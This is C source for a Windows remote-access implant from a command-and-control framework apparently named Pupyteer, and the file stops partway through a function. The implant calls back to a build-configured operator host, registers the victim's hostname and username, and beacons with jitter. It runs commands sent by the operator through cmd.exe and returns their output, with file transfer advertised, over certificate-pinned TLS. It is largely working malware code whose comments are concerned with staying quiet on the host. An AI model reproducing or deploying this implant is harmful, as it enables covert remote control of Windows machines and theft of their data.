/*
 * Pupyteer PE Agent Stub — Windows TCP Beacon
 * ------------------------------------------------
 * MinGW cross-compiled Windows agent that connects back to a
 * Pupyteer TCP listener using the JSON-line protocol.
 *
 * Compile:
 *   x86_64-w64-mingw32-gcc -o agent.exe agent.c -lws2_32
 *
 * Protocol (newline-delimited JSON over TCP):
 *   Agent -> Server:
 *     {"type":"register","auth":"...","hostname":"...","os":"windows",
 *      "arch":"x64","username":"...","agent_version":"...",
 *      "capabilities":[...],"max_line":65536}
 *     {"type":"checkin","session_id":"...","beacon":"..."}
 *     {"type":"output","session_id":"...","command_id":"...","beacon":"...","output":"..."}
 *   Server -> Agent:
 *     {"type":"registered","session_id":"...","beacon_token":"..."}
 *     {"type":"commands","commands":[{"command_id":"...","command":"..."}]}
 *     {"type":"ack"}
 *     {"type":"error","message":"..."}
 *
 * The two credentials are different and neither is optional on a default
 * listener: "auth" says this payload may become a session at all and is spent
 * once, at register; "beacon" is what the server hands back in answer and says
 * every later message speaks for *that* session rather than one whose id
 * someone read in operator output.
 *
 * "capabilities" and "max_line" are the same conversation continued: what this
 * binary can be asked to do, and how long a line it can be asked in. They are
 * reported from the code below rather than from a build switch, because a
 * claim about a handler that was compiled out is worse than no claim — the
 * server would queue the tasking, and whatever a shell said about the word
 * would come back looking like the target's answer.
 */

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <security.h>
#include <schannel.h>
#include <wincrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <time.h>
#include <io.h>
#include <math.h>

/* ── build-time configuration (filled by PEBuilder) ── */
#ifndef AGENT_HOST
#define AGENT_HOST "{{HOST}}"
#endif
#ifndef AGENT_PORT
#define AGENT_PORT {{PORT}}
#endif
#ifndef AGENT_SLEEP
#define AGENT_SLEEP {{SLEEP}}
#endif
#ifndef AGENT_JITTER
#define AGENT_JITTER {{JITTER}}
#endif
/* Enrollment secret: what lets this payload become a session at all. It is a
 * claim about which team server built this binary, not about who holds the
 * binary, so treat a recovered artifact as carrying it. */
#ifndef AGENT_AUTH
#define AGENT_AUTH "{{AUTH}}"
#endif
#ifndef AGENT_VERSION
#define AGENT_VERSION "1.0.0"
#endif
/* Callbacks over TLS, trusted by pinning the SHA-256 of the listener's own
 * certificate. A team server is reached by IP with a self-signed certificate, so
 * the system store can neither verify it nor be the thing we verify against, and
 * skipping validation would hand every command and result to whoever is on the
 * path. An empty pin means the build has no certificate to trust, which is
 * refused below rather than quietly downgraded to "accept any". */
#ifndef AGENT_TLS
#define AGENT_TLS {{TLS}}
#endif
#ifndef AGENT_TLS_FINGERPRINT
#define AGENT_TLS_FINGERPRINT "{{TLS_FINGERPRINT}}"
#endif

#define RECV_BUF_SIZE 65536
#define SEND_BUF_SIZE 65536
/* The same ceiling the Python agent clips a command result at, so how much
 * output an operator gets does not depend on which payload they dropped. The
 * buffers a result passes through are sized from the output itself (see
 * send_output), because escaping can turn one byte of that into six. */
#define MAX_CMD_OUTPUT (256 * 1024)
#define BEACON_SIZE 160

static char g_session_id[64] = {0};
static char g_beacon[BEACON_SIZE] = {0};
static char g_hostname[256] = {0};
static char g_username[256] = {0};
static const char *g_agent_version = AGENT_VERSION;

/* Registration was refused for a reason that a retry cannot fix. Beaming at a
 * server that will never enrol this payload is the loudest footprint an agent
 * can produce, so the loop stops instead of sleeping and trying again. */
static int g_fatal = 0;

/* The operator asked this implant to stop. Kept apart from g_fatal because the
 * two need different things at the top of main(): one is "the server will never
 * have us", the other is "do not come back on this beacon", and a shutdown that
 * falls through to a re-register is a shutdown that never happened. */
static int g_quit = 0;

/* ── helpers ── */

static void get_hostname(void) {
    DWORD sz = sizeof(g_hostname);
    if (!GetComputerNameA(g_hostname, &sz)) {
        strncpy_s(g_hostname, sizeof(g_hostname), "unknown", _TRUNCATE);
    }
}

static void get_username(void) {
    DWORD sz = sizeof(g_username);
    if (!GetUserNameA(g_username, &sz)) {
        strncpy_s(g_username, sizeof(g_username), "unknown", _TRUNCATE);
    }
}

/* Sleep for base_seconds * (1 +/- jitter_pct/100) */
static void jittered_sleep(int base_seconds, int jitter_pct) {
    if (jitter_pct <= 0) {
        Sleep((DWORD)base_seconds * 1000);
        return;
    }
    double delta = (double)base_seconds * (jitter_pct / 100.0);
    double offset = ((double)rand() / RAND_MAX * 2.0 - 1.0) * delta;
    double total = (double)base_seconds + offset;
    if (total < 1.0) total = 1.0;
    Sleep((DWORD)(total * 1000));
}

/* ── transport: raw TCP, or the same socket under TLS ──
 *
 * The protocol frames each message with a newline, so the two paths differ
 * only in where bytes come from and go to. Under TLS there is no framing of
 * our own on top: Schannel *is* the TLS stack, so whatever EncryptMessage
 * hands back is the record to write, and bytes read off the socket are fed to
 * DecryptMessage until it has a whole one.
 */

#define TLS_RECORD_CAP 32768
#define PLAIN_CAP (2 * RECV_BUF_SIZE)

typedef struct {
    CredHandle cred;
    CtxtHandle ctx;
    BOOL have_cred;
    BOOL have_ctx;
    SecPkgContext_StreamSizes sizes;
    BYTE *cipher;          /* records read but not yet decrypted */
    size_t cipher_len;
    size_t cipher_cap;
    char *plain;           /* decrypted bytes the reader has not consumed */
    size_t plain_len;
    size_t plain_off;
} tls_state;

static tls_state g_tls;
static int g_tls_on = 0;

static PSecurityFunctionTableA tls_api(void) {
    static PSecurityFunctionTableA table = NULL;
    if (!table) table = InitSecurityInterfaceA();
    return table;
}

static void tls_report(const char *stage, SECURITY_STATUS st) {
    char detail[160];
    snprintf(detail, sizeof(detail), "tls %s: 0x%08lx\n", stage, (unsigned long)st);
    OutputDebugStringA(detail);
}

static void tls_reset(void) {
    PSecurityFunctionTableA api = tls_api();
    if (g_tls.have_ctx && api) api->DeleteSecurityContext(&g_tls.ctx);
    if (g_tls.have_cred && api) api->FreeCredentialsHandle(&g_tls.cred);
    free(g_tls.cipher);
    free(g_tls.plain);
    memset(&g_tls, 0, sizeof(g_tls));
}

static int raw_send_all(SOCKET s, const char *data, size_t len) {
    size_t sent = 0;
    while (sent < len) {
        int n = send(s, data + sent, (int)(len - sent), 0);
        if (n <= 0) return -1;
        sent += (size_t)n;
    }
    return 0;
}

static int cipher_reserve(size_t extra) {
    if (g_tls.cipher_len + extra <= g_tls.cipher_cap) return 0;
    size_t cap = g_tls.cipher_cap ? g_tls.cipher_cap : TLS_RECORD_CAP;
    while (g_tls.cipher_len + extra > cap) cap *= 2;
    BYTE *grown = (BYTE *)realloc(g_tls.cipher, cap);
    if (!grown) return -1;
    g_tls.cipher = grown;
    g_tls.cipher_cap = cap;
    return 0;
}

static int cipher_fill(SOCKET s) {
    if (cipher_reserve(TLS_RECORD_CAP) != 0) return -1;
    int n = recv(s, (char *)g_tls.cipher + g_tls.cipher_len,
                 (int)(g_tls.cipher_cap - g_tls.cipher_len), 0);
    if (n <= 0) return -1;
    g_tls.cipher_len += (size_t)n;
    return 0;
}

/* Drop the bytes the SSPI layer has taken ownership of, keeping whatever a
 * second record already waiting in the same read. */
static void tls_consume_cipher(size_t n) {
    if (n > g_tls.cipher_len) n = g_tls.cipher_len;
    if (n == 0) return;
    memmove(g_tls.cipher, g_tls.cipher + n, g_tls.cipher_len - n);
    g_tls.cipher_len -= n;
}

static void plain_append(const char *data, size_t len) {
    if (!g_tls.plain) {
        g_tls.plain = (char *)malloc(PLAIN_CAP);
        if (!g_tls.plain) return;
    }
    if (g_tls.plain_off + g_tls.plain_len + len > PLAIN_CAP) {
        memmove(g_tls.plain, g_tls.plain + g_tls.plain_off, g_tls.plain_len);
        g_tls.plain_off = 0;
    }
    if (g_tls.plain_off + g_tls.plain_len + len > PLAIN_CAP) {
        /* A line longer than the buffer: dropping it is visible to the
         * operator as a command with no result, which beats handing back half
         * of a file listing that reads like all of one. */
        return;
    }
    memcpy(g_tls.plain + g_tls.plain_off + g_tls.plain_len, data, len);
    g_tls.plain_len += len;
}

/* The pinned value is the SHA-256 of the listener certificate's DER, compared
 * by hand after the handshake: the certificate is self-signed and no trust
 * store on the target has ever heard of it, which is why the handshake runs
 * with manual credential validation. Refusing an empty pin is the point of the
 * exercise; TLS that trusts any certificate is a man in the middle with extra
 * steps, and an agent cannot tell the difference from having none at all. */
static int tls_pin_ok(void) {
    PSecurityFunctionTableA api = tls_api();
    PCERT_CONTEXT cert = NULL;
    BYTE digest[32];
    DWORD digest_len = sizeof(digest);
    char hex[sizeof(digest) * 2 + 1];

    if (AGENT_TLS_FINGERPRINT[0] == '\0') return 0;
    if (!api || api->QueryContextAttributesA(&g_tls.ctx,
                                             SECPKG_ATTR_REMOTE_CERT_CONTEXT,
                                             &cert) != SEC_E_OK || !cert) {
        return 0;
    }
    if (!CryptHashCertificate((HCRYPTPROV_LEGACY)0, CALG_SHA_256, 0, cert->pbCertEncoded,
                              cert->cbCertEncoded, digest, &digest_len)
            || digest_len != sizeof(digest)) {
        CertFreeCertificateContext(cert);
        return 0;
    }
    /* Crypt32 allocated the certificate, so Crypt32 has to release it.
     * FreeContextBuffer is right for the tokens a handshake hands back and
     * wrong here: it LocalFrees a block the SSPI heap never owned, and the
     * corruption only surfaces as some later allocation falling over. */
    CertFreeCertificateContext(cert);
    for (DWORD i = 0; i < digest_len; i++) {
        snprintf(hex + i * 2, 3, "%02x", digest[i]);
    }
    return _stricmp(hex, AGENT_TLS_FINGERPRINT) == 0;
}

static int tls_handshake(SOCKET s) {
    PSecurityFunctionTableA api = tls_api();
    SECURITY_STATUS st;
    TimeStamp ttl;
    unsigned long attrs = 0;
    SecBuffer out[1];
    SecBuffer in[1];
    SecBufferDesc out_desc;
    SecBufferDesc in_desc;
    unsigned long flags = ISC_REQ_CONFIDENTIALITY | ISC_REQ_SEQUENCE_DETECT
                        | ISC_REQ_REPLAY_DETECT | ISC_REQ_MANUAL_CRED_VALIDATION
                        | ISC_REQ_ALLOCATE_MEMORY;

    if (!api) return -1;

    st = api->AcquireCredentialsHandleA(NULL, (char *)UNISP_NAME_A,
                                        SECPKG_CRED_OUTBOUND, NULL, NULL,
                                        NULL, NULL, &g_tls.cred, &ttl);
    if (st != SEC_E_OK) {
        tls_report("acquire credentials", st);
        return -1;
    }
    g_tls.have_cred = TRUE;

    out_desc.ulVersion = SECBUFFER_VERSION;
    out_desc.cBuffers = 1;
    out_desc.pBuffers = out;
    in_desc.ulVersion = SECBUFFER_VERSION;
    in_desc.cBuffers = 1;
    in_desc.pBuffers = in;

    /* The target name is what Schannel would normally match a certificate
     * against. Manual credential validation is set, so the pin below is the
     * verification and this string only has to be the address we dialled. */
    out[0].BufferType = SECBUFFER_TOKEN;
    out[0].pvBuffer = NULL;
    out[0].cbBuffer = 0;
    st = api->InitializeSecurityContextA(&g_tls.cred, NULL, (char *)AGENT_HOST,
                                         flags, 0, SECURITY_NATIVE_DREP,
                                         NULL, 0, &g_tls.ctx, &out_desc,
                                         &attrs, &ttl);
    if (st != SEC_I_CONTINUE_NEEDED && st != SEC_E_OK) {
        tls_report("client hello", st);
        return -1;
    }
    g_tls.have_ctx = TRUE;

    for (;;) {
        int sent = out[0].cbBuffer
                       ? raw_send_all(s, (char *)out[0].pvBuffer, out[0].cbBuffer)
                       : 0;
        api->FreeContextBuffer(out[0].pvBuffer);
        out[0].pvBuffer = NULL;
        out[0].cbBuffer = 0;
        if (sent != 0) return -1;
        if (st == SEC_E_OK) break;

        for (;;) {
            in[0].BufferType = SECBUFFER_TOKEN;
            in[0].pvBuffer = g_tls.cipher;
            in[0].cbBuffer = (unsigned long)g_tls.cipher_len;
            st = api->InitializeSecurityContextA(&g_tls.cred, &g_tls.ctx,
                                                 (char *)AGENT_HOST, flags, 0,
                                                 SECURITY_NATIVE_DREP,
                                                 &in_desc, 0, &g_tls.ctx,
                                                 &out_desc, &attrs, &ttl);
            if (st != SEC_E_INCOMPLETE_MESSAGE) break;
            /* A flight spread over several reads: keep collecting and hand the
             * whole thing over at once, which is what Schannel asked for. */
            if (cipher_fill(s) != 0) return -1;
        }

        if (st != SEC_I_CONTINUE_NEEDED && st != SEC_E_OK) {
            tls_report("handshake", st);
            return -1;
        }
        /* Whatever this call consumed is no longer ours to hand over again, but
         * a second flight may already sit behind it in the same buffer. */
        tls_consume_cipher(in[0].cbBuffer);
    }

    if (api->QueryContextAttributesA(&g_tls.ctx, SECPKG_ATTR_STREAM_SIZES,
                                     &g_tls.sizes) != SEC_E_OK) {
        tls_report("sizes", 0);
        return -1;
    }
    /* Two different answers because they call for different things from an
     * operator: -1 is a handshake that could have gone wrong for a transient
     * reason, so the beacon reconnects; -2 is a listener that is not the one
     * this payload was built for, which no amount of retrying will change. */
    return tls_pin_ok() ? 0 : -2;
}

static int tls_send(SOCKET s, const char *data) {
    PSecurityFunctionTableA api = tls_api();
    SecBufferDesc desc;
    SecBuffer buf[4];
    SECURITY_STATUS st;
    size_t body = strlen(data);
    /* One line, which under TLS means a newline like any other byte: the
     * plaintext path appends it with its own send(), and the framing on the
     * listener side reads nothing until it is there. */
    size_t len = body + 1;
    unsigned long hdr = (unsigned long)g_tls.sizes.cbHeader;
    unsigned long trl = (unsigned long)g_tls.sizes.cbTrailer;
    /* One TLS record carries at most cbMaximumMessage bytes of plaintext, and
     * a command result is routinely larger than that, so a line goes out as
     * however many records it needs. The reader sees one byte stream either
     * way; nothing on the other end has to know a split happened. */
    size_t chunk_max = g_tls.sizes.cbMaximumMessage
                           ? (size_t)g_tls.sizes.cbMaximumMessage : 16384;
    size_t cap = chunk_max + hdr + trl + (size_t)g_tls.sizes.cbBlockSize;
    BYTE *record = (BYTE *)malloc(cap);
    size_t off = 0;

    if (!record) return -1;

    while (off < len) {
        size_t chunk = len - off;
        size_t total;
        if (chunk > chunk_max) chunk = chunk_max;
        /* Derived from the clamped chunk and not from what is left to send: the
         * record is one record long, so a line longer than one has to copy one
         * record at a time. Getting this order wrong writes the rest of the
         * message past the end of `record`, which is a heap overflow rather than
         * a truncated send — the record that does go out is intact, so the
         * listener reads a good reply and the agent dies at whatever malloc
         * comes next. */
        size_t copy = chunk;
        if (off + copy > body) copy = body - off;    /* the rest is the \n */
        memcpy(record + hdr, data + off, copy);
        if (copy < chunk) record[hdr + copy] = '\n';

        /* Header, payload and trailer as three separate buffers rather than one
         * SECBUFFER_STREAM. The stream form is a convenience Schannel cannot
         * offer for the AEAD suites it negotiates now, where the tag covers the
         * header too and so cannot be written into a single flat record; it
         * answers that with SEC_E_INVALID_TOKEN and nothing leaves the socket. */
        buf[0].BufferType = SECBUFFER_STREAM_HEADER;
        buf[0].pvBuffer = record;
        buf[0].cbBuffer = hdr;
        buf[1].BufferType = SECBUFFER_DATA;
        buf[1].pvBuffer = record + hdr;
        buf[1].cbBuffer = (unsigned long)chunk;
        buf[2].BufferType = SECBUFFER_STREAM_TRAILER;
        buf[2].pvBuffer = record + hdr + chunk;
        buf[2].cbBuffer = trl;
        buf[3].BufferType = SECBUFFER_EMPTY;
        buf[3].pvBuffer = NULL;
        buf[3].cbBuffer = 0;
        desc.ulVersion = SECBUFFER_VERSION;
        desc.cBuffers = 4;
        desc.pBuffers = buf;

        st = api->EncryptMessage(&g_tls.ctx, 0, &desc, 0);
        if (st != SEC_E_OK) {
            tls_report("encrypt", st);
            break;
        }
        /* The suite decides how much header and tag it actually used, so the
         * record is as long as the three buffers now report rather than as long
         * as the room that was reserved for them. */
        total = (size_t)buf[0].cbBuffer + buf[1].cbBuffer + buf[2].cbBuffer;
        if (raw_send_all(s, (char *)record, total) != 0) break;
        off += chunk;
    }

    free(record);
    return off == len ? 0 : -1;
}

/* One DecryptMessage pass over whatever is buffered, reading from the socket
 * whenever the buffer does not hold a whole record. Returns 1 when it consumed
 * a record, 0 when nothing came of it, -1 on a failure that ends the socket. */
static int tls_decrypt_once(SOCKET s) {
    PSecurityFunctionTableA api = tls_api();
    SecBuffer buf[4];
    SecBufferDesc desc;
    SECURITY_STATUS st;
    size_t have, extra = 0;
    char *plain = NULL;
    size_t plain_len = 0;
    int i;

    if (!g_tls.cipher_len) {
        if (cipher_fill(s) != 0) return -1;
    }
    have = g_tls.cipher_len;

    /* One buffer in, three empty ones for Schannel to fill: it rewrites this
     * array to say where the plaintext ended up, which is *inside* the record
     * just handed over, and where the next record begins. Asking for a copy in
     * a buffer of our own is not on offer — the same AEAD restriction that
     * decides the shape of tls_send. */
    buf[0].BufferType = SECBUFFER_DATA;
    buf[0].pvBuffer = g_tls.cipher;
    buf[0].cbBuffer = (unsigned long)have;
    for (i = 1; i < 4; i++) {
        buf[i].BufferType = SECBUFFER_EMPTY;
        buf[i].pvBuffer = NULL;
        buf[i].cbBuffer = 0;
    }
    desc.ulVersion = SECBUFFER_VERSION;
    desc.cBuffers = 4;
    desc.pBuffers = buf;

    st = api->DecryptMessage(&g_tls.ctx, &desc, 0, NULL);
    if (st == SEC_E_INCOMPLETE_MESSAGE) {
        /* The buffer holds a prefix of a record and nothing more. Reading here
         * is what keeps the caller from spinning: recv blocks until the socket
         * has more bytes, so every pass either grows the buffer or fails. */
        if (cipher_fill(s) != 0) return -1;
        return 0;
    }
    if (st != SEC_E_OK && st != SEC_I_CONTEXT_EXPIRED) {
        if (st == SEC_I_RENEGOTIATE) {
            /* What DecryptMessage hands back here is a ClientHello to echo, not
             * protocol bytes. Answering it needs a handshake state machine this
             * agent does not have, and treating the token as a line of JSON
             * would corrupt the session instead of revealing it. Reconnecting
             * gets a fresh session either way. */
            tls_report("renegotiation", st);
        } else {
            tls_report("decrypt", st);
        }
        return -1;
    }

    for (i = 0; i < 4; i++) {
        if (buf[i].BufferType == SECBUFFER_DATA && buf[i].cbBuffer) {
            plain = (char *)buf[i].pvBuffer;
            plain_len = buf[i].cbBuffer;
        } else if (buf[i].BufferType == SECBUFFER_EXTRA) {
            extra = buf[i].cbBuffer;
        }
    }

    /* The plaintext points into the same buffer the records are stacked in, so
     * it has to be copied out before the consumed prefix is slid away. */
    if (plain_len) plain_append(plain, plain_len);
    tls_consume_cipher(have - extra);

    if (st == SEC_I_CONTEXT_EXPIRED) return -1;
    return plain_len ? 1 : 0;
}

/* Blocking read of one decrypted line; the same shape as the plaintext path
 * below so no caller has to know which one it is on.
 *
 * A line that does not fit is reported as a failure rather than handed back
 * short. Half a command is not a smaller command: it is a different one, and
 * the only thing the operator would see is a result that does not match what
 * they typed. */
static int tls_readline(SOCKET s, char *buf, int len) {
    int total = 0;
    int overflow = 0;

    for (;;) {
        while (g_tls.plain_off < g_tls.plain_len) {
            char c = g_tls.plain[g_tls.plain_off++];
            if (c == '\n') {
                buf[total] = '\0';
                return overflow ? -1 : total;
            }
            if (c == '\r') continue;
            if (total < len - 1) buf[total++] = c;
            else overflow = 1;
        }
        if (g_tls.plain_off == g_tls.plain_len) {
            g_tls.plain_off = g_tls.plain_len = 0;
        }
        int progress = tls_decrypt_once(s);
        if (progress < 0) return -1;
    }
}

static void close_conn(SOCKET s) {
    /* The SSPI handles belong to this socket, not to the process: keeping a
     * credentials handle across a reconnect is how a beacon ends up talking
     * TLS session-record-number state from a connection that no longer exists. */
    tls_reset();
    closesocket(s);
}

static int agent_send(SOCKET s, const char *data) {
    if (g_tls_on) return tls_send(s, data);

    size_t len = strlen(data);
    size_t sent = 0;
    while (sent < len) {
        int n = send(s, data + sent, (int)(len - sent), 0);
        if (n <= 0) return -1;
        sent += (size_t)n;
    }
    if (send(s, "\n", 1, 0) != 1) return -1;
    return 0;
}

static int agent_readline(SOCKET s, char *buf, int len) {
    if (g_tls_on) return tls_readline(s, buf, len);

    int total = 0;
    int overflow = 0;
    char c;
    for (;;) {
        int n = recv(s, &c, 1, 0);
        if (n <= 0) return -1;
        if (c == '\n') break;
        if (c == '\r') continue;
        if (total < len - 1) buf[total++] = c;
        else overflow = 1;                /* read to the end, then drop it */
    }
    buf[total] = '\0';
    return overflow ? -1 : total;
}

/* ── JSON helpers ── */

static int hex_nibble(char c) {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

/* Four hex digits as a number, or -1 if these are not four hex digits. Reading
 * stops at the first non-digit, so it never walks past the NUL that ends the
 * string it was called on. */
static int hex4(const char *p) {
    int value = 0;
    for (int k = 0; k < 4; k++) {
        int d = hex_nibble(p[k]);
        if (d < 0) return -1;
        value = value * 16 + d;
    }
    return value;
}

static const char *json_get_string(const char *json, const char *key, char *out, size_t out_sz) {
    char pattern[128];
    snprintf(pattern, sizeof(pattern), "\"%s\"", key);
    const char *p = strstr(json, pattern);
    if (!p) { out[0] = '\0'; return NULL; }
    p += strlen(pattern);
    while (*p && (*p == ' ' || *p == '\t' || *p == ':' || *p == ',')) p++;
    if (*p != '"') { out[0] = '\0'; return NULL; }
    p++;
    /* Four bytes of room per step because one escape can write that much UTF-8. */
    size_t i = 0;
    while (*p && *p != '"' && i + 4 < out_sz) {
        if (*p == '\\' && p[1]) {
            p++;
            switch (*p) {
                case 'n': out[i++] = '\n'; break;
                case 'r': out[i++] = '\r'; break;
                case 't': out[i++] = '\t'; break;
                case '"': out[i++] = '"'; break;
                case '\\': out[i++] = '\\'; break;
                case '/': out[i++] = '/'; break;
                case 'u': {
                    /* The listener writes JSON with the default ensure_ascii, so
                     * a command that is not pure ASCII reaches this agent as
                     * \uXXXX. Turning it back into the bytes cmd.exe expects is
                     * what lets an operator type the file name they meant on a
                     * host that is not on an English code page; leaving it would
                     * run a command called "u5de5u5177" instead. */
                    int cp = hex4(p + 1);
                    if (cp >= 0xD800 && cp <= 0xDBFF && p[5] == '\\' && p[6] == 'u') {
                        int low = hex4(p + 7);
                        if (low >= 0xDC00 && low <= 0xDFFF) {
                            cp = 0x10000 + ((cp - 0xD800) << 10) + (low - 0xDC00);
                            p += 6;               /* the pair's second escape */
                        }
                    }
                    if (cp < 0 || (cp >= 0xD800 && cp <= 0xDFFF)) {
                        out[i++] = '?';           /* not a character: one honest byte */
                    } else if (cp < 0x80) {
                        out[i++] = (char)cp;
                    } else if (cp < 0x800) {
                        out[i++] = (char)(0xC0 | (cp >> 6));
                        out[i++] = (char)(0x80 | (cp & 0x3F));
                    } else if (cp < 0x10000) {
                        out[i++] = (char)(0xE0 | (cp >> 12));
                        out[i++] = (char)(0x80 | ((cp >> 6) & 0x3F));
                        out[i++] = (char)(0x80 | (cp & 0x3F));
                    } else {
                        out[i++] = (char)(0xF0 | (cp >> 18));
                        out[i++] = (char)(0x80 | ((cp >> 12) & 0x3F));
                        out[i++] = (char)(0x80 | ((cp >> 6) & 0x3F));
                        out[i++] = (char)(0x80 | (cp & 0x3F));
                    }
                    p += 4;
                    break;
                }
                default: out[i++] = *p; break;
            }
        } else {
            out[i++] = *p;
        }
        p++;
    }
    out[i] = '\0';
    return out;
}

/* Read a value that has to arrive whole. `json_get_string` answers a value it
 * ran out of room for with the prefix it could hold, which is the wrong answer
 * for a path: half of "\\Server\\Share\\folder" is not a shorter path but a
 * different file, and a listing or a write that silently targets it is worse
 * than one that says no.
 *
 * Returns 1 when the value is there and fits (possibly empty), 0 when no such
 * string value is in the task at all, and -1 when it is there but too long. The
 * last two are different faults: an absent path is the caller's question, while
 * a cut one says something about the transport — the transfer sizes its chunks
 * from the line length this session declared, so a path that does not fit means
 * that declaration did not describe this agent. */
static int json_get_whole_string(const char *json, const char *key, char *out, size_t out_sz) {
    char pattern[128];
    snprintf(pattern, sizeof(pattern), "\"%s\"", key);
    const char *p = strstr(json, pattern);
    if (!p) { out[0] = '\0'; return 0; }
    p += strlen(pattern);
    while (*p && (*p == ' ' || *p == '\t' || *p == ':' || *p == ',')) p++;
    if (*p != '"') { out[0] = '\0'; return 0; }
    size_t room = strlen(p + 1) + 1;          /* to the NUL of the task */
    if (room > out_sz) room = out_sz;         /* never write past the caller's buffer */
    if (room < 4) room = 4;
    if (!json_get_string(json, key, out, room)) return 0;
    /* Escapes shrink as they are decoded, so the decoded length is the most
     * this reader can consume before refusing to write another four bytes.
     * Anything still open at that point had nowhere left to go. */
    if (strlen(out) + 4 >= out_sz) {
        out[0] = '\0';
        return -1;
    }
    return 1;
}

/* Where the JSON object starting at `start` ends, or NULL if the text stops
 * first. A string counts as a string: a command holding a brace — `echo {`, or
 * a path with braces in it, which cmd.exe neither expands nor forbids — would
 * otherwise close the object early, and every command queued after it in the
 * same check-in would be skipped as though it had never been sent. */
static const char *json_object_end(const char *start) {
    int depth = 0, in_string = 0, escaped = 0;
    const char *p = start;
    while (*p) {
        if (in_string) {
            if (escaped) escaped = 0;
            else if (*p == '\\') escaped = 1;
            else if (*p == '"') in_string = 0;
        } else if (*p == '"') in_string = 1;
        else if (*p == '{') depth++;
        else if (*p == '}' && --depth == 0) return p + 1;
        p++;
    }
    return NULL;
}

/* One source byte becomes at most six output bytes: a control character is
 * written as \u00XX. The listener parses these lines with a strict JSON reader,
 * which rejects a bare byte below 0x20 inside a string — so the old habit of
 * passing such a byte through did not make the result ugly, it made the whole
 * message unparsable and lost the command's output. Escaping is what the Python
 * agent's json.dumps already does.
 *
 * It is given a length rather than a C string because command output is
 * whatever a program wrote: a captured NUL is one character of that output, not
 * the end of it. */
static void json_escape(const char *src, size_t src_len, char *dst, size_t dst_sz) {
    size_t j = 0;
    if (dst_sz < 7) { dst[0] = '\0'; return; }
    for (size_t i = 0; i < src_len && j + 6 < dst_sz; i++) {
        unsigned char c = (unsigned char)src[i];
        switch (c) {
            case '"':  dst[j++] = '\\'; dst[j++] = '"'; break;
            case '\\': dst[j++] = '\\'; dst[j++] = '\\'; break;
            case '\n': dst[j++] = '\\'; dst[j++] = 'n'; break;
            case '\r': dst[j++] = '\\'; dst[j++] = 'r'; break;
            case '\t': dst[j++] = '\\'; dst[j++] = 't'; break;
            default:
                if (c < 0x20) {
                    snprintf(dst + j, 7, "\\u%04x", c);
                    j += 6;
                } else {
                    dst[j++] = (char)c;
                }
                break;
        }
    }
    dst[j] = '\0';
}

/* The room a JSON string of this much text can need, plus the NUL. Callers size
 * an escape buffer with this and the message off the result, so escaping never
 * has to drop what it ran out of — which is also what keeps a multi-byte UTF-8
 * sequence from being cut in half. */
#define JSON_ESCAPED_MAX(n) ((size_t)(n) * 6 + 1)

/* ── command execution ── */

static void exec_command(const char *cmd, char *out, size_t out_sz, size_t *out_len) {
    char tmpfile[MAX_PATH];
    char cmdline[4096];
    /* The process id joins the tick because two payloads of the same build can
     * run on one host — the operator's own test and a copy that drifted — and
     * GetTickCount repeats every 49 days. Sharing a capture file means one
     * reads the other's output, or deletes the file before the other opens it. */
    snprintf(tmpfile, MAX_PATH, "%s\\pupyteer_tmp_%lu_%lu.txt",
             getenv("TEMP") ? getenv("TEMP") : "C:\\Windows\\Temp",
             GetCurrentProcessId(), GetTickCount());
    snprintf(cmdline, sizeof(cmdline), "cmd.exe /c \"%s\" > \"%s\" 2>&1", cmd, tmpfile);

    int rc = system(cmdline);

    FILE *f = NULL;
    *out_len = 0;
    /* Binary, not text: the text mode CRT translates CRLF to LF and reads an
     * 0x1A as end-of-file, and command output is whatever a program wrote, not
     * only text a program wrote. A captured executable would come back changed
     * with nothing to say so. */
    fopen_s(&f, tmpfile, "rb");
    if (f) {
        size_t want = out_sz - 1;
        /* A single fread is allowed to return less than asked for and still have
         * the file holding more, so keep filling until either runs out. */
        while (*out_len < want) {
            size_t n = fread(out + *out_len, 1, want - *out_len, f);
            if (n == 0) break;
            *out_len += n;
        }
        fclose(f);
        DeleteFileA(tmpfile);
    } else {
        snprintf(out, out_sz, "command executed (rc=%d), output capture unavailable", rc);
        *out_len = strlen(out);
        /* What did get captured still sits in that file. Leaving it behind for
         * the next person to find is the opposite of why the output was run
         * through a temporary file rather than a pipe nobody reads. */
        DeleteFileA(tmpfile);
    }
    out[*out_len] = '\0';
}

/* ── protocol handlers ── */

static int handle_register(SOCKET s) {
    char escaped_auth[BEACON_SIZE], escaped_host[512], escaped_user[512];
    char msg[SEND_BUF_SIZE];
    json_escape(AGENT_AUTH, strlen(AGENT_AUTH), escaped_auth, sizeof(escaped_auth));
    json_escape(g_hostname, strlen(g_hostname), escaped_host, sizeof(escaped_host));
    json_escape(g_username, strlen(g_username), escaped_user, sizeof(escaped_user));
    /* What this file implements, named the way the server names it. A payload
     * that claimed the Python agent's whole vocabulary would have the server
     * queue a screenshot it cannot take and get back a shell's complaint about
     * the word, printed as if the host had answered.
     *
     * `max_line` is RECV_BUF_SIZE because that is the real limit: a command line
     * longer than the read buffer is dropped at the socket, and a file transfer
     * whose chunks are dropped halfways is the one failure an operator finds out
     * about from the size of the file they get. */
    snprintf(msg, sizeof(msg),
             "{\"type\":\"register\",\"auth\":\"%s\",\"hostname\":\"%s\","
             "\"os\":\"windows\",\"arch\":\"x64\",\"username\":\"%s\","
             "\"agent_version\":\"%s\","
             "\"capabilities\":[\"exec\",\"ping\",\"sysinfo\",\"processes\","
             "\"network\",\"fs_list\",\"fs_get\",\"fs_put\",\"shutdown\"],"
             "\"max_line\":%d}",
             escaped_auth, escaped_host, escaped_user, g_agent_version,
             RECV_BUF_SIZE);
    return agent_send(s, msg);
}

/* What a program printed is in the host's own code page; what JSON has to carry
 * is UTF-8. This is not a cosmetic mismatch: a byte that is not part of a valid
 * UTF-8 sequence does not arrive as one odd character, it makes the whole line
 * undecodable and the command's result never appears. A host whose output is
 * ASCII is unaffected; a Chinese, Russian or Greek desktop is not.
 *
 * The tiers are ordered by how much they keep: strict conversion, then the same
 * conversion letting Windows substitute for the bytes it cannot read, then a
 * pass that keeps the ASCII and marks the rest. The last one loses text, and it
 * exists so the loss is on that result's tail rather than on the message. */
static char *utf8_from_oem(const char *bytes, size_t len, size_t *out_len) {
